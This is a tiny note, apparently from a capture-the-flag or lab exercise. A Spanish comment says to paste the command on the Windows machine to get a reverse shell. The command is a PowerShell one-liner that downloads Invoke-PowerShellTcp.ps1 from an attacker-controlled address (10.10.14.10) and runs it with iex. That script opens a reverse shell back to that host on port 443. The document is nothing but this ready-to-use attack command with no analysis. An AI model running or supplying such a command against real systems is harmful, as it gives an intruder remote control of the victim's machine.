#Copiar en la maquina windows (cambiando la IP del comando y del script) para obtener la reverse shell

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10:4141/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.10 -Port  443

